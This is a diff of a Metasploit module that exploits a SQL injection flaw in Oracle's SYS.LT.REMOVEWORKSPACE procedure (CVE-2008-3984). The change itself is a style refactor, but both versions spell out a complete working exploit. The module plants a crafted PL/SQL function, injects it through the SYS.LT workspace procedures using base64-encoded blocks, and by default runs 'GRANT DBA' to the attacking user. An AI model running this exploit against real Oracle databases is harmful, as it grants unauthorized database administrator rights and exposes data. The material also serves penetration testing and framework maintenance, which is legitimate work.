@@ -7,35 +7,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE',
-      'Description'    => %q{
-        This module exploits a sql injection flaw in the REMOVEWORKSPACE
-        procedure of the PL/SQL package SYS.LT. Any user with execute
-        privilege on the vulnerable package can exploit this vulnerability.
-      },
-      'Author'         => [ 'Sh2kerr <research[ad]dsecrg.com>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE',
+        'Description' => %q{
+          This module exploits a sql injection flaw in the REMOVEWORKSPACE
+          procedure of the PL/SQL package SYS.LT. Any user with execute
+          privilege on the vulnerable package can exploit this vulnerability.
+        },
+        'Author' => [ 'Sh2kerr <research[ad]dsecrg.com>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2008-3984' ],
           [ 'OSVDB', '49326']
         ],
-      'DisclosureDate' => '2008-10-13'))
+        'DisclosureDate' => '2008-10-13',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-        ])
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execte.', "GRANT DBA to #{datastore['DBUSER']}"]),
+      ]
+    )
   end
 
   def run
-    return if not check_dependencies
+    return if !check_dependencies
 
-    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
+    name = Rex::Text.rand_text_alpha_upper(1..10)
+    rand1 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand2 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand3 = Rex::Text.rand_text_alpha_upper(1..10)
     cruft = Rex::Text.rand_text_alpha_upper(1)
 
     function = "
@@ -49,23 +58,23 @@ class MetasploitModule < Msf::Auxiliary
       RETURN '#{cruft}';
       END;"
 
-    package1 = %Q|
+    package1 = %|
       BEGIN
         SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
       END;
       |
 
-    package2 = %Q|
+    package2 = %|
       BEGIN
         SYS.LT.REMOVEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
       END;
       |
 
-    uno  = Rex::Text.encode_base64(function)
-    dos  = Rex::Text.encode_base64(package1)
+    uno = Rex::Text.encode_base64(function)
+    dos = Rex::Text.encode_base64(package1)
     tres = Rex::Text.encode_base64(package2)
 
-    sql = %Q|
+    sql = %|
       DECLARE
       #{rand1} VARCHAR2(32767);
       #{rand2} VARCHAR2(32767);
@@ -83,15 +92,14 @@ class MetasploitModule < Msf::Auxiliary
     clean = "DROP FUNCTION #{cruft}"
 
     # Try first, if it's good.. keep doing the dance.
-    print_status("Attempting sql injection on SYS.LT.REMOVEWORKSPACE...")
+    print_status('Attempting sql injection on SYS.LT.REMOVEWORKSPACE...')
     begin
       prepare_exec(sql)
-    rescue => e
+    rescue StandardError
       return
     end
 
     print_status("Removing function '#{cruft}'...")
     prepare_exec(clean)
-
   end
 end
